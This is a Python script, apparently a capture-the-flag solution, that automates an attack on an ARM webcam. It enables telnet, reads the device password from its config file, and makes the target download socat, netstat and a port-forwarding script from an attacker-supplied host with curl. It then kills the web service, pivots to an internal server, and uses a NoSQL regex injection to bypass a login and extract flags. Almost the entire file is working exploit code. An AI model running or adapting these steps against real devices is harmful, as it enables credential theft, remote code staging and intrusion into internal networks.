#!/usr/bin/env python
from warnings import filterwarnings
filterwarnings("ignore")
import telnetlib
import sys
import time
import argparse
import os
import threading
import requests
import subprocess
from re import compile,search
from sys import exit
from base64 import b64encode
from requests.auth import HTTPBasicAuth
from termcolor import colored
from PIL import Image
from io import BytesIO

class MachineInstance:
    def __init__(self, address=None, port=None,endpoint=None,username=None,password=None,authToken=None,cookie=None):
        self.address = address
        self.port = port
        self.endpoint = endpoint
        self.username = username
        self.password = password
        self.authToken= authToken
        self.cookie = cookie
        
def isAlive(address):
    try:
        subprocess.check_output(['ping', '-c', '1', address])
        return True
    except subprocess.CalledProcessError:
        return False
    
def stylePrint(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)
        
def print_dangerous(message):
    dangerous_icon = colored("[✔] 💀", 'red')  # You can customize the icon
    decorated_message = f"{dangerous_icon} {colored(message, 'red')}\n"
    stylePrint(decorated_message)


def print_statement(setting_name, success=True):
    if success:
        tick_mark = colored("[✔]", 'yellow')
        statement = colored(f"{setting_name}", 'white')
        stylePrint(f"{tick_mark} {statement}\n")
    else:
        cross_mark = colored("[✖]", 'red')
        statement = colored(f"{setting_name}", 'red')
        stylePrint(f"{cross_mark} {statement}\n")

def getLine(output, lineNumber):
    # Split the output by newline characters
    lines = output.split('\n')
    # Get the line at the specified line_number
    if 0 < lineNumber <= len(lines):
        # Remove leading and trailing whitespace
        return lines[lineNumber - 1].strip()
    else:
        return None
        
def readFile(connection,command,prompt=b"# "):
    connection.write(command.encode("utf-8") + b"\n")
    # Read until you receive the prompt twice to capture the full output
    fileContent = connection.read_until(prompt, timeout=5).decode("utf-8")
    fileContent += connection.read_until(prompt, timeout=5).decode("utf-8")
    return fileContent 

def sendRequest(machineInstance=None,type=None,headers=None,data=None):
    url=f"http://{machineInstance.address}:{machineInstance.port}/{machineInstance.endpoint}"
    if type == "POST":
        return requests.post(url,auth=HTTPBasicAuth(username=machineInstance.username, password=machineInstance.password),headers=headers,data=data)
    else:
        return requests.get(url,auth=HTTPBasicAuth(username=machineInstance.username, password=machineInstance.password),headers=headers)
    
def sendExploit(command,connection):
    try:
        connection.write(command.encode('utf-8')+b'\n')
        time.sleep(2)
        return 200
    except KeyboardInterrupt:
        connection.close()
        sys.exit(0)
    except Exception as e:
        print_statement(f"Error Sending Command : {e}",success=False)
        


def main(machineInstance,attackerInstance):
    attackerIP=attackerInstance.address
    attackerPort=attackerInstance.port
    script_1="kill -9 $(~/netstat -tulnp | grep webs | sed 's/[:[:space:]]/,/g' | cut -d ',' -f 50 | cut -d '/' -f 1);"
    script_2=f"~/socat tcp-listen:50628,fork,reuseaddr tcp:{machineInstance.address}:8080\n"
    portforward=script_1+script_2
    fileName="./arm-binaries/script.sh"
    with open(fileName, 'w') as file:
        file.write(portforward)
    uploadList={
        "🚀 Uploading-Socat":f"curl http://{attackerIP}:{attackerPort}/socat -o ~/socat -s",
        "🚀 Uploading-Netstat":f"curl http://{attackerIP}:{attackerPort}/netstat -o ~/netstat -s",
        "🚀 Uploading-Script":f"curl http://{attackerIP}:{attackerPort}/script.sh -o ~/script.sh -s",
    }
    settingList={
        "📡 Setting-Socat":"chmod +x ~/socat",
        "📡 Setting-Netstat":"chmod +x ~/netstat",
        "📡 Setting-Script":"chmod +x ~/script.sh",
    }
    print("\n")
    # First Upload Binaries
    print_dangerous("Uploading Binaries...")
    for command in uploadList:
        data=command.split("-")
        print_statement(f"{data[0]}\t\t\t\t: {colored(data[1],'yellow')}")
        connection=telnetlib.Telnet(machineInstance.address,port=23)
        response=sendExploit(command=uploadList[command],connection=connection)
        time.sleep(7) # It takes time to save the files, else it's gonna be a seg fault
        if response==200:
            continue
        else:
            print_statement(f"Error Sending Exploit {uploadList[command]}",success=False)
        time.sleep(2)
    # Set the permissions
    print_dangerous("Setting the Stage...")
    for command in settingList:
        data=command.split("-")
        print_statement(f"{data[0]}\t\t\t\t\t: {colored(data[1],'yellow')}")
        connection=telnetlib.Telnet(machineInstance.address,port=23)
        response=sendExploit(command=settingList[command],connection=connection)
        if response==200:
            continue
        else:
            print_statement(f"Error Sending Exploit {settingList[command]}",success=False)
        time.sleep(2)
    print("\n")
    connection.close()
    
# Getting the First Flag
def getFirstFlag(machineInstance):
    try:
        url=f"http://{machineInstance.address}:{machineInstance.port}/live/0/mjpeg.jpg"
        headers={
            "Authorization": f"Basic {machineInstance.authToken}"
        }
        response=requests.get(url,headers=headers)
        imagedata=response.content
        img=Image.open(BytesIO(imagedata))
        img.save("First-Flag.jpg")
        print_statement(f"🚩🚩 First-Flag\t\t\t\t: {colored(f'{os.getcwd()}/First-Flag.jpg','green')}")
        return 0
    except KeyboardInterrupt:
        sys.exit(1)
    except Exception as e:
        print_statement(f"Error getting first flag {e}",success=False)

# Getting the Second Flag
def getSecondFlag(machineInstance):
    try:
        response = sendRequest(machineInstance=machineInstance)
        cookie_match = search(r'PHPSESSID=([a-fA-F0-9]+);', response.headers.get('Set-Cookie', ''))
        if cookie_match:
            machineInstance.cookie = cookie_match.group(1)
        else:
            print("\n")
            print_statement("😢 Unable to Authenticate",success=False)
            print_statement("😭 Portforwarding didn't work properly",success=False)
            print_statement("💡 Restart the Target Server",success=False)
            exit(1)
        headers = {
            "Set-Cookie": f"PHPSESSID={machineInstance.cookie}",
            "Authorization": f"Basic {machineInstance.authToken}"
        }
        data = {
            "username[$regex]": ".*", 
            "password": "HoHoHacked"
        }
        response=sendRequest(machineInstance=machineInstance,headers=headers,data=data,type="POST")        
        flagPattern = compile(r'<li class="text-sm mt-3 font-medium ml-6">([^<]+)</li>')
        flagMatch = flagPattern.findall(response.text)
        if flagMatch:
            print_statement(f"Yeti-Key\t\t\t\t\t: {colored(flagMatch[1].strip(),'green')}")
        else:
            print_statement("Failure fetchin Flag",success=False)
    except KeyboardInterrupt:
        sys.exit(1)
    except Exception as e:
        print_statement(f"Error getting second flag {e}",success=False)
    return 0


# Starting Point
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(description="Get Flag")
        parser.add_argument("--address", "-a", dest="address", required=True, help="Server IP Address")
        parser.add_argument("--port", "-p", dest="port", required=True, help="Server Port")
        parser.add_argument("--lhost", "-lh", dest="attackerIP", required=True, help="Attacker IP Address For HTTP File Transfer")
        parser.add_argument("--lport", "-lp", dest="attackerPort", required=True, help="Attacker Port For HTTP File Transfer")
        args = parser.parse_args()
        if not isAlive(args.address):
                print_statement("Host Down",success=False)
                sys.exit(0)
        machineInstance=MachineInstance(
            address=args.address, 
            port=args.port,
            endpoint="login.php/",
            username="admin",
        )
        attackerInstance=MachineInstance(
            address=args.attackerIP,
            port=args.attackerPort,
        )
        try:
            # Enable Telenet
            print(f"\n{colored('⚠️ Disclaimer: The automation runs once, may require a target restart and a 5-minute gap with each restart before attack ⚠️', 'yellow')}")
            time.sleep(4)
            print_dangerous("🔥 Hacking the ARM Webcam")
            os.system(f"/usr/bin/python2 ./dependency/enableTelnet.py -a {machineInstance.address} -p {machineInstance.port}")
            readCommand = "cat /var/etc/umconfig.txt | grep 'password=' | cut -d '=' -f2-5"
            # Start Exfiltrating Password
            connection=telnetlib.Telnet(machineInstance.address,port=23)
            data=readFile(connection=connection,command=readCommand)
            lineNumber=8 # you will realize this when you see a wireshark capture, while command gets executed
            readPassword=getLine(data,lineNumber)
            machineInstance.password=readPassword
            print_dangerous(f"🔑 Exfiltrating Webcam Password\t\t: {colored(readPassword,'green')}")
            print_dangerous(f"😈 Backdoor Setup complete\t\t: {colored(f'Usage => telnet {machineInstance.address}','yellow')}")
            
            # Upload our binaries
            main(machineInstance,attackerInstance)
            # Get the First Flag
            print_dangerous("📂 Exfiltrating Flag One")
            userpass = f"{machineInstance.username}:{machineInstance.password}"
            machineInstance.authToken=b64encode(userpass.encode('utf-8')).decode('utf-8')
            getFirstFlag(machineInstance=machineInstance)
            
            # Open Port Forwarding
            print_dangerous("🔥 Hacking Internal Network")
            telnetThread=threading.Thread(target=sendExploit,args=("/bin/sh ~/script.sh",connection))
            telnetThread.start()
            
            time.sleep(4) # wait for some time before fetching second flag
            print_dangerous("📂 Exfiltrating Yeti Flag")
            getSecondFlag(machineInstance=machineInstance)
            # Closing the telnet connection
            connection.close()
        except ConnectionRefusedError:
            print_statement(f"Connection Refused, try restarting the target",success=False)
        except KeyboardInterrupt:
            connection.close()
            sys.exit("interrupted")
        except Exception as e:
            connection.close()
            print_statement(f"Error Exploiting : {e}",success=False)
    except KeyboardInterrupt:
        connection.close()
        sys.exit(0)
    except Exception as e:
        connection.close()
        print(f"ERROR : {e}")
        sys.exit(1)




